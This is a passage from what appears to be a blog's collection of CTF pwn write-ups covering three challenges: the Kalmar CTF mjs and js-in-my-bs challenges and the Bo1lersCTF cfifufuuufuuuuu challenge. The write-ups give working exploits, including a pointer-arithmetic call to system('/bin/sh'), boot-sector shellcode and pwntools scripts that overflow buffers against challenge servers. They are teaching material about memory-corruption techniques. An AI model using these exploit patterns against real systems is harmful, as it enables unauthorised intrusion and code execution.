-<p><img data-src="/2023-03-05_171552.png" alt="2023-03-05_171552.png"></p>
-<p>When I&#39;m playing around with this javascript engine. I found following interesting statements. </p>
-<p>We can operate function pointer using mathematical operation (like C). </p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">17:19:25 $ ./mjsvuln -e <span class="string">&quot;print(print)&quot;</span></span><br><span class="line">&lt;foreign_ptr@405920&gt;</span><br><span class="line">undefined</span><br><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:25:52 $ ./mjsvuln -e <span class="string">&quot;(0x405920)(1)&quot;</span></span><br><span class="line">  at &lt;stdin&gt;:1</span><br><span class="line">MJS error: calling non-callable</span><br><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:26:04 $ ./mjsvuln -e <span class="string">&quot;(print+9-9)(print)&quot;</span></span><br><span class="line">&lt;foreign_ptr@405920&gt;</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
-
-<p><em>The binary is compiled with glibc2.34. I&#39;m using Ubuntu20.04, so I need to recompile the binary again. So, some function offset might is different from the original binary.</em></p>
-<p>I calculated the offset between <code>print</code> and <code>ffi</code>. And try to call <code>ffi</code> again. This time, it succeed with an unknown function pointer.</p>
-<p><img data-src="/2023-03-05_183906.png" alt="2023-03-05_183906.png"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:46:33 $ python -c <span class="string">&quot;print(0x0040cbb0-0x00405920)&quot;</span></span><br><span class="line">29328</span><br><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:46:38 $ ./mjsvuln -e <span class="string">&#x27;let f= (print+29328)(&quot;int system(char *)&quot;);&#x27;</span></span><br><span class="line">&lt;???-562949926229504&gt;</span><br></pre></td></tr></table></figure>
-
-<p>Then I can just called <code>/bin/sh</code> and got the shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[aynakeya @ LAPTOP-T6NBK8L5]:/mnt/d/workspace/kalmarctf/mjs_handout</span><br><span class="line">18:46:40 $ ./mjsvuln -e &#x27;let f= (print+29328)(&quot;int system(char *)&quot;);f(&quot;/bin/sh&quot;)&#x27;</span><br><span class="line">$ ls</span><br><span class="line">Dockerfile  README.txt  diff.patch  exploit.js  mjs  mjs_src  mjsvuln  remote.py  source  ynetd</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x2-final-exploit"><a href="#0x2-final-exploit" class="headerlink" title="0x2 final exploit"></a>0x2 final exploit</h1><p>offset is little different in the original binary</p>
-<p>exploit.js</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let f= (print+27312)(&quot;int system(char *)&quot;);f(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x3-flag"><a href="#0x3-flag" class="headerlink" title="0x3 flag"></a>0x3 flag</h1><p><code>kalmar&#123;mjs_brok3ey_565591da7d942fef817c&#125;</code></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>[Pwn] js-in-my-bs [Kalmar CTF 2023]</title>
-    <url>/ctf-writeup/2023/kalmar/pwn/js-in-my-bs/index.html</url>
-    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Description: TDB</p>
-<p>Files: TBD</p>
-<h1 id="0x1-Playing-around-with-their-JS-engine"><a href="#0x1-Playing-around-with-their-JS-engine" class="headerlink" title="0x1 Playing around with their JS engine"></a>0x1 Playing around with their JS engine</h1><p>Challenge runs under a i386 environment using a simulator (qemu)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./qemu-system-i386 -L /bios -display none -drive format=raw,file=&quot;./bootjs.bin&quot; -serial stdio</span><br></pre></td></tr></table></figure>
-
-<p>qemu simulator will load boot section in bootjs.bin and spawn a javascript console(?).</p>
-<p>In this javascript console, I was able to executing some basic command such as simple math operation, print(function calling), and variable assignment.</p>
-<p><img data-src="/2023-03-05_220531.png" alt="2023-03-05_220531.png"></p>
-<p>However, I found certain limitation when playing with this simulator</p>
-<ol>
-<li>variable name can only be an one byte character, (eg <code>a</code>,<code>b</code>)</li>
-<li>math operation only support number from 0-9 (also single byte)</li>
-</ol>
-<p>OK, then where is the flag. Lets take look at bootjs.bin</p>
-<h1 id="0x2-Preparation"><a href="#0x2-Preparation" class="headerlink" title="0x2 Preparation"></a>0x2 Preparation</h1><p>Before starting reversing, I first did some research about i386 boot loader. (see reference section)</p>
-<p>boot loader is loaded after bios. and bios will load first sector of  boot loader (<strong>512 bytes</strong>) to a fixed address in memory (0x7c00). </p>
-<p><img data-src="/2023-03-05_221209.png" alt="2023-03-05_221209.png"></p>
-<p>Boot loader is usually written in 16-bit assembly. executing in cpu real mode. </p>
-<p>The main task for boot loader is to load kernel into memory. Then, kernel will deal with everything else after that. (Which is not the case for this challenge, the boot loader for this challenge is a js engine)</p>
-<h1 id="0x3-Reversing-Analyzing"><a href="#0x3-Reversing-Analyzing" class="headerlink" title="0x3 Reversing &amp; Analyzing"></a>0x3 Reversing &amp; Analyzing</h1><p>After loaded <code>bootjs.bin</code> in Binary Ninja. I found the placeholder flag instantaneously. flag bytes start at <code>0x7e00</code> after a MBR boot signature <code>55AA</code>. </p>
-<p>Above flag bytes, there is a huge chunk of suspicious <code>A</code>s. </p>
-<p><img data-src="/2023-03-05_222644.png" alt="2023-03-05_222644.png"></p>
-<p>We know that bios only load first sector of boot loader into memory, flag bytes was clearly not in the memory (0x7e00-0x7c00 &#x3D; 0x200 &#x3D; 512).</p>
-<p>(Therefore, at some point, I have to executing some shellcode so that I could load flag bytes into the memory.)</p>
-<p>After took some time analyzing the binary file, I came up with those  functions</p>
-<p><img data-src="/2023-03-05_224254.png" alt="2023-03-05_224254.png"></p>
-<p><code>print_byte</code>: print one byte as ascii to screen.</p>
-<p><code>print_crlf</code>: print CRLF to screen <code>\r\n</code> </p>
-<p><code>print_hex</code>: print 4 bit as hex.</p>
-<p><img data-src="/2023-03-05_224037.png" alt="2023-03-05_224037.png"></p>
-<p><code>read_input</code>: read one byte from user input and print it back to screen</p>
-<p><img data-src="/2023-03-05_224658.png" alt="2023-03-05_224658.png"></p>
-<p><code>math_op</code>: perform math operation recursively</p>
-<p><img data-src="/2023-03-05_224909.png" alt="2023-03-05_224909.png"></p>
-<p><code>input_to_num</code>: ask one byte from user input. </p>
-<p>If user input is a number then return the number itself (<code>sub al, 0x30</code>). </p>
-<p>Otherwise, it is a variable. So, it will get the value of that variable using <code>var_to_num</code>(actually set si to the data offset) and return the value.</p>
-<p><img data-src="/2023-03-05_225041.png" alt="2023-03-05_225041.png"></p>
-<p><code>entry</code>: main loop</p>
-<p>if second byte is <code>=</code>, it will perform variable assignment <code>mov word ptr [si], bx</code>. </p>
-<p>If second byte is a <code>(</code>, it will regard first byte as a fucntion name. and call this function. <code>call word ptr [si]</code></p>
-<p><img data-src="/2023-03-05_225456.png" alt="2023-03-05_225456.png"></p>
-<p><code>log_print</code>: print two bytes as hex</p>
-<p><img data-src="/2023-03-05_230553.png" alt="2023-03-05_230553.png"></p>
-<p><strong>Finally</strong>, the vulnerable funtion <code>var_to_num</code></p>
-<p>This function uses the suspicious chunk start from <code>0x7cda</code> as a <strong>variable table</strong></p>
-<p>This <strong>variable table</strong> store all existing variable name and value (or function name and address). Each variable entry (or function entry) occupy 3 bytes (1 byte name, 2 byte data).</p>
-<p>For example, the binary came with a built in function <code>l</code> (which print value in a variable as hex). </p>
-<p>So, in the variable table, <code>6c7a7c</code> represents this entry. Where <code>6c</code> is the function name <code>l</code>, <code>7a7c</code> is the function address of <code>log_print</code> in little endian (<code>0x7c7a</code>) </p>
-<p><img data-src="/2023-03-05_225921.png" alt="2023-03-05_225921.png"></p>
-<p>Also, register <code>cx</code> hold how many variables&#x2F;functions are in the variable table.</p>
-<p>Here is the pesudo code for <code>var_to_num</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">func var_to_num(var_name):</span><br><span class="line">    si = variable_table = 0x7cda</span><br><span class="line">    idx = 0</span><br><span class="line">    while idx &lt; cx:</span><br><span class="line">        if var_name is the first byte in variable table:</span><br><span class="line">            si = si +1 // move si to data section</span><br><span class="line">            return</span><br><span class="line">        si = si +3 // move to next entry</span><br><span class="line">        idx ++</span><br><span class="line">    // if variable name not found in variable table</span><br><span class="line">    cx = cx + 1 // increase variable count</span><br><span class="line">    si[0] = var_name // set first byte to variable name</span><br><span class="line">    si = si + 1 // move si to data section</span><br><span class="line">    return </span><br></pre></td></tr></table></figure>
-
-<p>Here we go, I got a limited arbitrary write in an executable region!</p>
-<p>limitation: first bytes of every three bytes in shellcodes must be different</p>
-<p>Now I can write shellcode in this region and run the shellcode by calling a custom function.</p>
-<h1 id="0x4-crafting-shellcode"><a href="#0x4-crafting-shellcode" class="headerlink" title="0x4 crafting shellcode"></a>0x4 crafting shellcode</h1><p>Our shellcode need to do two thing: load second sector from drive into the memory; and print out the flag</p>
-<h2 id="print-out-flag"><a href="#print-out-flag" class="headerlink" title="print out flag:"></a>print out flag:</h2><ol>
-<li>setting up register</li>
-<li>using <code>lodsb</code> to load one byte to <code>al</code> and move <code>si</code> to next byte</li>
-<li>print out <code>al</code> using <code>out dx,al</code></li>
-<li>jump to step 2 again using <code>jmp</code></li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    mov dx, 0x3f8              ; serial out</span><br><span class="line">    mov si, bx                 ; source buffer (start of flag)</span><br><span class="line">loop:</span><br><span class="line">    lodsb                      ; load byte from si into al, advance si</span><br><span class="line">    out dx, al                 ; send al to serial out</span><br><span class="line">    jmp loop                   ; repeat</span><br><span class="line">    nop</span><br></pre></td></tr></table></figure>
-
-<h2 id="load-second-sector-into-memory"><a href="#load-second-sector-into-memory" class="headerlink" title="load second sector into memory"></a>load second sector into memory</h2><p>This part is bit tricky, but I found a very good post about how to load second sector <a href="http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/">http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/</a>. </p>
-<p>So I just copy paste their assembly code and did some modification.</p>
-<p>something to be noted</p>
-<p><code>int 0x13</code> uses cylinder-head-sector (CHS) addressing. In CHS addressing, sector index start with <strong>1</strong> instead of <strong>0</strong> due to some historical reason.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ah, 0x2                ; read sectors from drive</span><br><span class="line">nop</span><br><span class="line">mov al, 1                  ; sectors to read</span><br><span class="line">nop</span><br><span class="line">mov ch, 0                  ; cylinder idx</span><br><span class="line">nop</span><br><span class="line">mov dh, 0                  ; head idx</span><br><span class="line">nop</span><br><span class="line">mov cl, 2                  ; sector idx</span><br><span class="line">nop</span><br><span class="line">mov dl, 0x80               ; disk idx</span><br><span class="line">nop</span><br><span class="line">mov bx, 0x7e00             ; target pointer</span><br><span class="line">int 0x13                   ; interrupt</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="final-shellcode"><a href="#final-shellcode" class="headerlink" title="final shellcode"></a>final shellcode</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[bits 16]</span><br><span class="line"></span><br><span class="line">start:</span><br><span class="line">    mov ah, 0x2                ; read sectors from drive</span><br><span class="line">    nop</span><br><span class="line">    mov al, 1                  ; sectors to read</span><br><span class="line">    nop</span><br><span class="line">    mov ch, 0                  ; cylinder idx</span><br><span class="line">    nop</span><br><span class="line">    mov dh, 0                  ; head idx</span><br><span class="line">    nop</span><br><span class="line">    mov cl, 2                  ; sector idx</span><br><span class="line">    nop</span><br><span class="line">    mov dl, 0x80               ; disk idx</span><br><span class="line">    nop</span><br><span class="line">    mov bx, 0x7e00             ; target pointer</span><br><span class="line">    int 0x13                   ; interrupt</span><br><span class="line">    mov dx, 0x3f8              ; serial out</span><br><span class="line">    mov si, bx                 ; source buffer (start of flag)</span><br><span class="line">loop:</span><br><span class="line">    lodsb                      ; load byte from si into al, advance si</span><br><span class="line">    out dx, al                 ; send al to serial out</span><br><span class="line">    jmp loop                   ; repeat</span><br><span class="line">    nop                        ; padding</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>credit to my teammate @jason</p>
-</blockquote>
-<p>compile it with</p>
-<p><code>nasm shellcode.asm -o shellcode.o</code></p>
-<p>yep! all the first bytes are different!!!!!</p>
-<p><img data-src="/2023-03-05_233622.png" alt="2023-03-05_233622.png"></p>
-<h1 id="0x5-Script-Steps"><a href="#0x5-Script-Steps" class="headerlink" title="0x5 Script Steps"></a>0x5 Script Steps</h1><ol>
-<li>write function which point to shell code</li>
-<li>write shellcode</li>
-<li>call shellcode</li>
-<li>retrieve flag</li>
-</ol>
-<h1 id="0x6-Exploit"><a href="#0x6-Exploit" class="headerlink" title="0x6 Exploit"></a>0x6 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([<span class="string">&quot;qemu-system-i386&quot;</span>, </span><br><span class="line">            <span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./bios&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-display&quot;</span>,<span class="string">&quot;none&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-drive&quot;</span>,<span class="string">&quot;format=raw,file=bootjs.bin&quot;</span>,</span><br><span class="line">            <span class="string">&quot;-serial&quot;</span>,<span class="string">&quot;stdio&quot;</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;54.93.211.13&quot;</span>, <span class="number">10000</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.LOCAL:</span><br><span class="line">    hash_challenge = io.recvline().split()</span><br><span class="line">    lp(<span class="string">&quot;proof of work:&quot;</span>, hash_challenge)</span><br><span class="line">    <span class="keyword">if</span> hash_challenge[<span class="number">0</span>] == <span class="string">b&#x27;hashcash&#x27;</span> <span class="keyword">and</span> hash_challenge[<span class="number">1</span>] == <span class="string">b&#x27;-mb28&#x27;</span>:</span><br><span class="line">        response = subprocess.run([</span><br><span class="line">            <span class="string">&#x27;hashcash&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;-mb28&#x27;</span>,</span><br><span class="line">            hash_challenge[<span class="number">2</span>].decode(),</span><br><span class="line">        ], capture_output=<span class="literal">True</span>).stdout</span><br><span class="line">        io.send(response)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_js</span>(<span class="params">value</span>):</span><br><span class="line">    io.sendafter(<span class="string">b&quot;&gt; &quot;</span>,value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_rs</span>(<span class="params">is_log</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\r\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> is_log:</span><br><span class="line">        data = io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shellcode = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b40290b00190b50090b60090b10290b28090bb007ecd13baf80389deaceeebfc90&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_mem</span>(<span class="params">val,value</span>):</span><br><span class="line">    <span class="comment"># dec_value = int.from_bytes(value,&quot;little&quot;)</span></span><br><span class="line">    payload = val+<span class="string">b&#x27;=&#x27;</span>+(<span class="built_in">str</span>(value % <span class="number">9</span>)+<span class="string">&quot;+9&quot;</span>*(value // <span class="number">9</span>)+<span class="string">&quot;\n&quot;</span>).encode()</span><br><span class="line">    <span class="comment"># lp(payload)</span></span><br><span class="line">    send_js(payload)</span><br><span class="line">    <span class="comment"># lp(io.recvuntil(b&quot;\r\n&quot;))</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;\r\n&quot;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">write_to_mem(<span class="string">b&quot;a&quot;</span>,<span class="number">0x7c7a</span>)</span><br><span class="line">write_to_mem(<span class="string">b&#x27;b&#x27;</span>,<span class="number">0x7ce3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(shellcode),<span class="number">3</span>):</span><br><span class="line">    part =  shellcode[i:i+<span class="number">3</span>]</span><br><span class="line">    lp(<span class="string">&quot;sending&quot;</span>,i,part[<span class="number">0</span>].to_bytes(<span class="number">1</span>,<span class="string">&quot;little&quot;</span>),<span class="built_in">hex</span>(<span class="built_in">int</span>.from_bytes(part[<span class="number">1</span>:],<span class="string">&quot;little&quot;</span>)))</span><br><span class="line">    write_to_mem(part[<span class="number">0</span>].to_bytes(<span class="number">1</span>,<span class="string">&quot;little&quot;</span>),<span class="built_in">int</span>.from_bytes(part[<span class="number">1</span>:],<span class="string">&quot;little&quot;</span>))</span><br><span class="line"></span><br><span class="line">send_js(<span class="string">b&quot;b(0)&quot;</span>)</span><br><span class="line">lp(io.recvuntil(<span class="string">b&quot;&#125;&quot;</span>))</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
-
-<h1 id="0x7-flag"><a href="#0x7-flag" class="headerlink" title="0x7 flag"></a>0x7 flag</h1><p><code>kalmar&#123;this_would_be_a_nice_addon_to_all_efi_shells_right?&#125;</code></p>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ol>
-<li><a href="https://infosecwriteups.com/writing-a-bootloader-931da062f25b">https://infosecwriteups.com/writing-a-bootloader-931da062f25b</a></li>
-<li><a href="https://medium.com/swlh/an-introduction-to-i386-boot-loader-programming-823354b80846">https://medium.com/swlh/an-introduction-to-i386-boot-loader-programming-823354b80846</a></li>
-<li><a href="http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/">http://3zanders.co.uk/2017/10/18/writing-a-bootloader3/</a></li>
-<li><a href="https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html">https://www.eecg.utoronto.ca/~amza/www.mindsec.com/files/x86regs.html</a></li>
-<li><a href="https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=02h:_Read_Sectors_From_Drive">https://en.wikipedia.org/wiki/INT_13H#INT_13h_AH=02h:_Read_Sectors_From_Drive</a></li>
-</ol>
-]]></content>
-  </entry>
-  <entry>
-    <title>[Pwn] cfifufuuufuuuuu [Bo1lersCTF 2023]</title>
-    <url>/ctf-writeup/2023/bo1lersctf/pwn/cfifufuuufuuuuu/index.html</url>
-    <content><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>A tiny program, protected by some Python code. The flag is in: .&#x2F;flag.txt</p>
-<p><a href="https://github.com/b01lers/b01lers-ctf-2023-public/tree/main/pwn/cfifufuuufuuuuu">files</a></p>
-<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="loader"><a href="#loader" class="headerlink" title="loader"></a>loader</h2><p>my analysis database <a href="./s.bndb">s.bndb</a></p>
-<p>This binary is run by a python loaders. python loader is acting like a debugger.</p>
-<p>Everytime a breakpoint instruction (<code>0xcc</code>) being executed. python loader will check next byte after rip. And determine what to do next depend on that byte.</p>
-<p>for example, if next byte is <code>0x48</code>. it will replace some register</p>
-<p><img data-src="/2023-03-28_214738.png" alt="image"></p>
-<p>otherwise, if the next byte is equal to some other bytes. it will do a canary check manually</p>
-<p><img data-src="/2023-03-28_214958.png" alt="image"></p>
-<h2 id="vulnerability-1-canary-check-failed"><a href="#vulnerability-1-canary-check-failed" class="headerlink" title="vulnerability 1 - canary check failed"></a>vulnerability 1 - canary check failed</h2><p>it did have canary check. The canary values are actually saved return pointers. However, when comparing return pointers, it only check if return pointer exists in the stack. So, we can still modify the saved return pointer to the caller&#39;s saved return pointer.</p>
-<h2 id="vulnerability-2-overwriting"><a href="#vulnerability-2-overwriting" class="headerlink" title="vulnerability 2 - overwriting"></a>vulnerability 2 - overwriting</h2><p>Bascially, the binary contains 2 main function. <code>encrypt</code> and <code>decrypt</code></p>
-<p><code>decrypt</code> function calls a function which read all bytes until it meet a new line character (<code>\n</code>). This is a trivial buffer overflow we can use to modify return pointer.</p>
-<p>using this vulnerability with the previous one, we can run <code>main</code> function again.</p>
-<p>since <code>_start</code> function is essentially a loop if return value of <code>main</code> is not equal to 1</p>
-<p><img data-src="/2023-03-28_220216.png" alt="image"></p>
-<h2 id="vulnerability-3-random-generation"><a href="#vulnerability-3-random-generation" class="headerlink" title="vulnerability 3 - random generation"></a>vulnerability 3 - random generation</h2><p>encrypt function generating random values by reading <code>/dev/urandom</code>. And store using input is .bss section.</p>
-<p>it also use a global variable to record index of the data array. everytime we call <code>encrypt</code>, the index will increase by one.</p>
-<p><img data-src="/2023-03-28_215944.png" alt="image"></p>
-<p>normally it&#39;s okay, because we are only executing <code>encrypt</code> function once.</p>
-<p>however, since we can run <code>encrypt</code> function multiple time. we increase the index value until we overwrite <code>/dev/urandom</code> string.</p>
-<h2 id="conclusion"><a href="#conclusion" class="headerlink" title="conclusion"></a>conclusion</h2><p>we overwrite <code>/dev/urandom</code>, and the program will print out the flag for us!</p>
-<h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">exe = ELF(&quot;s&quot;)</span><br><span class="line"># exe_rop = ROP(exe)</span><br><span class="line"># libc = ELF(&quot;libc.so.6&quot;)</span><br><span class="line"># ld = ELF(&quot;./ld-2.27.so&quot;)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"># context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line"></span><br><span class="line">def wait(*msg):</span><br><span class="line">    if args.WAIT:</span><br><span class="line">        input(&quot; &quot;.join(map(str,msg)))</span><br><span class="line"></span><br><span class="line">def log_print(*msg):</span><br><span class="line">    log.info(&quot; &quot;.join(map(str,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line">def start():</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        r = process([&quot;python&quot;,&quot;./loader.py&quot;])</span><br><span class="line">        r.recvuntil(b&quot;pid=&quot;)</span><br><span class="line">        pid = int(r.recvuntil(b&quot;;\n&quot;,drop=True))</span><br><span class="line">        print(&quot;pid of the binary is %d&quot; % pid)</span><br><span class="line">        if args.R2:</span><br><span class="line">            util.proc.wait_for_debugger(pid)</span><br><span class="line">    else:</span><br><span class="line">        r = remote(&quot;ctf.b01lers.com&quot;, 5215)</span><br><span class="line">    return r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">flagstring = b&quot;flag.txt&quot;.ljust(0x10,b&quot;\x00&quot;)</span><br><span class="line">nonesense = b&#x27;\x00&#x27;*0x10</span><br><span class="line">payload = flat(&#123;</span><br><span class="line">    0x0: b&#x27;\x00&#x27;*0x10, # make all 0, easier for xor</span><br><span class="line">    0x38:[</span><br><span class="line">        0x00004005e2, # _start if eax=1, call main again </span><br><span class="line">    ]</span><br><span class="line">&#125;)+b&#x27;\n&#x27;</span><br><span class="line"># filled up data</span><br><span class="line">for i in range(8):</span><br><span class="line">    io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)</span><br><span class="line">    io.sendafter(b&quot;Your data to decrypt?:\n&quot;,nonesense)</span><br><span class="line">    io.sendafter(b&quot;Your key?:\n&quot;,payload)</span><br><span class="line"># overflow /dev/urandom</span><br><span class="line">io.sendafter(b&quot;Your data to encrypt?:\n&quot;,flagstring)</span><br><span class="line">io.recvuntil(b&quot;Your key:\n&quot;)</span><br><span class="line">lp(&quot;flag: &quot;, io.recvuntil(b&quot;\n&quot;,drop=True))</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
 ]]></content>
   </entry>
 </search>
